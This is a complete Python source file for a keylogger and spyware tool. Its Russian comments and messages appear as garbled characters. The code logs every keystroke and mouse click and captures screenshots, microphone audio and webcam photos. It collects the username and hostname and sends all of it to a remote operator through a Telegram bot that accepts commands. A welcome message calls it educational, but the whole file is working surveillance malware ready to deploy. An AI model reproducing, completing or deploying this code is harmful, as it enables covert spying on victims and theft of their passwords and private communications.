import time
import os
import threading
import platform
import socket
import psutil
from datetime import datetime
from pynput import keyboard, mouse
from PIL import ImageGrab
import requests
from io import BytesIO
import telebot
from telebot.types import Message, ReplyKeyboardMarkup, KeyboardButton
import sounddevice as sd
from scipy.io.wavfile import write
import numpy as np
import cv2
from screeninfo import get_monitors

# ========== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ==========
TELEGRAM_BOT_TOKEN = "Bot_token" # –∑–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à —Ç–æ–∫–µ–Ω –±–æ—Ç–∞. —Å–æ–∑–¥–∞—Ç—å —á–µ—Ä–µ–∑ @BotFather
TELEGRAM_CHAT_ID = "Chat_id" # –∑–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à chat_id. —É–∑–Ω–∞—Ç—å —á–µ—Ä–µ–∑ @userinfobot
SCREENSHOT_KEY = keyboard.Key.f8
AUDIO_RECORD_KEY = keyboard.Key.f7
WEBCAM_KEY = keyboard.Key.f6
LOG_FILE = "keylog.txt"
AUDIO_DURATION = 10  # —Å–µ–∫—É–Ω–¥
# ==================================

class AdvancedKeylogger:
    def __init__(self):
        self.log = ""
        self.screenshot_counter = 0
        self.audio_counter = 0
        self.webcam_counter = 0
        self.is_logging = True
        self.is_recording_audio = False
        self.bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
        self.setup_telegram_handlers()
        
        self.create_folders()
        
    def create_folders(self):
        folders = ["screenshots", "audio", "webcam", "logs"]
        for folder in folders:
            if not os.path.exists(folder):
                os.makedirs(folder)
        
    def setup_telegram_handlers(self):
        @self.bot.message_handler(commands=['start', 'help'])
        def send_welcome(message: Message):
            markup = self.create_keyboard()
            welcome_text = """
            ü§ñ –£—á–µ–±–Ω—ã–π –∫–µ–π–ª–æ–≥–µ—Ä –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω! ü§ñ
            
            –î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:
            /screenshot - —Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç
            /audio - –∑–∞–ø–∏—Å–∞—Ç—å –∞—É–¥–∏–æ (10 —Å–µ–∫)
            /webcam - —Å–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã
            /log - –ø–æ–ª—É—á–∏—Ç—å –ª–æ–≥ –Ω–∞–∂–∞—Ç–∏–π –∫–ª–∞–≤–∏—à
            /sysinfo - –ø–æ–ª—É—á–∏—Ç—å —Å–∏—Å—Ç–µ–º–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
            /status - —Å—Ç–∞—Ç—É—Å —Ä–∞–±–æ—Ç—ã
            /stop_log - –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ
            /start_log - –≤–æ–∑–æ–±–Ω–æ–≤–∏—Ç—å –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ
            """
            self.bot.send_message(message.chat.id, welcome_text, reply_markup=markup)
            
        @self.bot.message_handler(commands=['screenshot'])
        def send_screenshot(message: Message):
            self.bot.reply_to(message, "üì∏ –î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç...")
            self.take_screenshot()
            
        @self.bot.message_handler(commands=['audio'])
        def record_audio(message: Message):
            self.bot.reply_to(message, "üéôÔ∏è –ó–∞–ø–∏—Å—ã–≤–∞—é –∞—É–¥–∏–æ (10 —Å–µ–∫—É–Ω–¥)...")
            threading.Thread(target=self.record_and_send_audio).start()
            
        @self.bot.message_handler(commands=['webcam'])
        def take_webcam_photo(message: Message):
            self.bot.reply_to(message, "üì∑ –î–µ–ª–∞—é —Ñ–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã...")
            threading.Thread(target=self.capture_webcam).start()
            
        @self.bot.message_handler(commands=['log'])
        def send_log(message: Message):
            self.send_log_file(message.chat.id)
            
        @self.bot.message_handler(commands=['sysinfo'])
        def send_sysinfo(message: Message):
            sysinfo = self.get_system_info()
            self.bot.send_message(message.chat.id, f"üñ•Ô∏è –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:\n\n{sysinfo}")
            
        @self.bot.message_handler(commands=['status'])
        def send_status(message: Message):
            status = "‚úÖ –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–∫—Ç–∏–≤–Ω–æ" if self.is_logging else "‚ùå –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ"
            self.bot.send_message(message.chat.id, f"üìä –°—Ç–∞—Ç—É—Å –∫–µ–π–ª–æ–≥–µ—Ä–∞:\n\n{status}")
            
        @self.bot.message_handler(commands=['stop_log'])
        def stop_logging(message: Message):
            self.is_logging = False
            self.bot.send_message(message.chat.id, "‚è∏Ô∏è –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ")
            
        @self.bot.message_handler(commands=['start_log'])
        def start_logging(message: Message):
            self.is_logging = True
            self.bot.send_message(message.chat.id, "‚ñ∂Ô∏è –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–æ–∑–æ–±–Ω–æ–≤–ª–µ–Ω–æ")
            
        @self.bot.message_handler(func=lambda message: True)
        def handle_all_messages(message: Message):
            text = message.text.lower()
            if "—Å–∫—Ä–∏–Ω—à–æ—Ç" in text:
                self.bot.reply_to(message, "üì∏ –î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç...")
                self.take_screenshot()
            elif "–∞—É–¥–∏–æ" in text or "–∑–∞–ø–∏—Å—å" in text:
                self.bot.reply_to(message, "üéôÔ∏è –ó–∞–ø–∏—Å—ã–≤–∞—é –∞—É–¥–∏–æ (10 —Å–µ–∫—É–Ω–¥)...")
                threading.Thread(target=self.record_and_send_audio).start()
            elif "–≤–µ–±–∫–∞–º–µ—Ä–∞" in text or "–∫–∞–º–µ—Ä–∞" in text:
                self.bot.reply_to(message, "üì∑ –î–µ–ª–∞—é —Ñ–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã...")
                threading.Thread(target=self.capture_webcam).start()
            elif "–ª–æ–≥" in text:
                self.send_log_file(message.chat.id)
            elif "—Å–∏—Å—Ç–µ–º–∞" in text or "–∏–Ω—Ñ–æ" in text:
                sysinfo = self.get_system_info()
                self.bot.send_message(message.chat.id, f"üñ•Ô∏è –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:\n\n{sysinfo}")
            elif "—Å—Ç–∞—Ç—É—Å" in text:
                status = "‚úÖ –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–∫—Ç–∏–≤–Ω–æ" if self.is_logging else "‚ùå –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ"
                self.bot.send_message(message.chat.id, f"üìä –°—Ç–∞—Ç—É—Å –∫–µ–π–ª–æ–≥–µ—Ä–∞:\n\n{status}")
            else:
                self.bot.reply_to(message, "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –∏–ª–∏ –∫–æ–º–∞–Ω–¥—ã –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è")

    def create_keyboard(self):
        markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        btn1 = KeyboardButton('üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç')
        btn2 = KeyboardButton('üéôÔ∏è –ê—É–¥–∏–æ –∑–∞–ø–∏—Å—å')
        btn3 = KeyboardButton('üì∑ –í–µ–±–∫–∞–º–µ—Ä–∞')
        btn4 = KeyboardButton('üìÑ –õ–æ–≥ –∫–ª–∞–≤–∏—à')
        btn5 = KeyboardButton('üñ•Ô∏è –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è')
        btn6 = KeyboardButton('üìä –°—Ç–∞—Ç—É—Å')
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
        return markup

    def send_to_telegram(self, chat_id, data, is_photo=False, is_audio=False, is_document=False, caption=None):
        try:
            if is_photo:
                self.bot.send_photo(chat_id, data, caption=caption)
            elif is_audio:
                self.bot.send_audio(chat_id, data, caption=caption)
            elif is_document:
                self.bot.send_document(chat_id, data, caption=caption)
            else:
                self.bot.send_message(chat_id, data)
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: {e}")

    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshots/screenshot_{timestamp}.png"
            
            screenshot.save(filename, format="PNG")
            
            with open(filename, 'rb') as img:
                self.send_to_telegram(
                    TELEGRAM_CHAT_ID, 
                    img, 
                    is_photo=True, 
                    caption=f"üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç #{self.screenshot_counter+1}\n{timestamp}"
                )
            
            self.screenshot_counter += 1
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {e}")

    def record_and_send_audio(self):
        try:
            devices = sd.query_devices()
            default_input = sd.default.device[0]
            
            device_info = sd.query_devices(default_input, 'input')
            channels = min(device_info['max_input_channels'], 1)  
            
            fs = 44100  
            recording = sd.rec(int(AUDIO_DURATION * fs), 
                              samplerate=fs, 
                              channels=channels,
                              device=default_input)
            sd.wait() 
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"audio/audio_{timestamp}.wav"
            write(filename, fs, recording)
            
            with open(filename, 'rb') as audio:
                self.send_to_telegram(
                    TELEGRAM_CHAT_ID, 
                    audio, 
                    is_audio=True, 
                    caption=f"üéôÔ∏è –ê—É–¥–∏–æ–∑–∞–ø–∏—Å—å #{self.audio_counter+1}\n{timestamp}"
                )
            
            self.audio_counter += 1
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –∞—É–¥–∏–æ: {e}")
            try:
                fs = 44100
                recording = sd.rec(int(AUDIO_DURATION * fs), samplerate=fs, channels=1)
                sd.wait()
                
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"audio/audio_{timestamp}.wav"
                write(filename, fs, recording)
                
                with open(filename, 'rb') as audio:
                    self.send_to_telegram(
                        TELEGRAM_CHAT_ID, 
                        audio, 
                        is_audio=True, 
                        caption=f"üéôÔ∏è –ê—É–¥–∏–æ–∑–∞–ø–∏—Å—å #{self.audio_counter+1}\n{timestamp}"
                    )
                
                self.audio_counter += 1
            except Exception as e2:
                print(f"–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥ —Ç–∞–∫–∂–µ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª: {e2}")

    def capture_webcam(self):
        try:
            cap = cv2.VideoCapture(0)
            
            time.sleep(1)
            
            ret, frame = cap.read()
            
            if ret:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"webcam/webcam_{timestamp}.jpg"
                
                cv2.imwrite(filename, frame)
                
                with open(filename, 'rb') as img:
                    self.send_to_telegram(
                        TELEGRAM_CHAT_ID, 
                        img, 
                        is_photo=True, 
                        caption=f"üì∑ –í–µ–±–∫–∞–º–µ—Ä–∞ #{self.webcam_counter+1}\n{timestamp}"
                    )
                
                self.webcam_counter += 1
            else:
                print("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã")
            
            cap.release()
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –≤–µ–±–∫–∞–º–µ—Ä—ã: {e}")

    def send_log_file(self, chat_id):
        try:
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'rb') as f:
                    self.send_to_telegram(
                        chat_id, 
                        f, 
                        is_document=True, 
                        caption="üìÑ –õ–æ–≥ –Ω–∞–∂–∞—Ç–∏–π –∫–ª–∞–≤–∏—à"
                    )
            else:
                self.bot.send_message(chat_id, "–§–∞–π–ª –ª–æ–≥–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç.")
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–∞: {e}")

    def get_system_info(self):
        try:
            system_info = f"""
            üñ•Ô∏è –°–∏—Å—Ç–µ–º–∞: {platform.system()} {platform.release()}
            üíª –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: {platform.processor()}
            üêç Python: {platform.python_version()}
            üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {os.getlogin()}
            üåê –•–æ—Å—Ç–Ω–µ–π–º: {socket.gethostname()}
            üìä –ü–∞–º—è—Ç—å: {psutil.virtual_memory().percent}% –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ
            üíæ –î–∏—Å–∫: {psutil.disk_usage('/').percent}% –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ
            ‚è∞ –í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            """
            return system_info
        except Exception as e:
            return f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏: {e}"

    def save_log(self):
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"\n\n[{timestamp}]\n{self.log}")
            self.log = ""
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ª–æ–≥–∞: {e}")

    def on_press(self, key):
        try:
            if key == SCREENSHOT_KEY:
                threading.Thread(target=self.take_screenshot).start()
            elif key == AUDIO_RECORD_KEY:
                threading.Thread(target=self.record_and_send_audio).start()
            elif key == WEBCAM_KEY:
                threading.Thread(target=self.capture_webcam).start()
            
            if self.is_logging:
                if hasattr(key, 'char') and key.char is not None:
                    self.log += key.char
                else:
                    self.log += f" [{key.name}] "
                
                if len(self.log) >= 100:
                    self.save_log()
                    
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–ª–∞–≤–∏—à–∏: {e}")

    def on_click(self, x, y, button, pressed):
        if pressed and self.is_logging:
            timestamp = datetime.now().strftime("%H:%M:%S")
            self.log += f" [–ú—ã—à—å: {button} at ({x}, {y}) - {timestamp}] "

    def run_telegram_bot(self):
        print("–ó–∞–ø—É—Å–∫ Telegram –±–æ—Ç–∞...")
        try:
            self.bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –±–æ—Ç–∞ Telegram: {e}")
            time.sleep(10)
            self.run_telegram_bot()

    def start(self):
        bot_thread = threading.Thread(target=self.run_telegram_bot)
        bot_thread.daemon = True
        bot_thread.start()
        
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        keyboard_listener.daemon = True
        keyboard_listener.start()
        
        mouse_listener = mouse.Listener(on_click=self.on_click)
        mouse_listener.daemon = True
        mouse_listener.start()
        
        print("–ö–µ–π–ª–æ–≥–µ—Ä –∑–∞–ø—É—â–µ–Ω. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–ª–∞–≤–∏—à–∏:")
        print("F8 - –°–∫—Ä–∏–Ω—à–æ—Ç")
        print("F7 - –ó–∞–ø–∏—Å—å –∞—É–¥–∏–æ (10 —Å–µ–∫)")
        print("F6 - –§–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã")
        print("–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—ã –≤ Telegram –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è")
        
        try:
            while True:
                time.sleep(1)
                if self.log and len(self.log) > 0:
                    self.save_log()
        except KeyboardInterrupt:
            print("–û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–µ–π–ª–æ–≥–µ—Ä–∞...")
            keyboard_listener.stop()
            mouse_listener.stop()

if __name__ == "__main__":
    try:
        import psutil
        import sounddevice
        import scipy
        import cv2
        import screeninfo
    except ImportError as e:
        print(f"–ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –±–∏–±–ª–∏–æ—Ç–µ–∫–∞: {e}")
        print("–£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –µ—ë —Å –ø–æ–º–æ—â—å—é: pip install psutil sounddevice scipy opencv-python screeninfo")
        exit(1)
    
    logger = AdvancedKeylogger()
    logger.start()
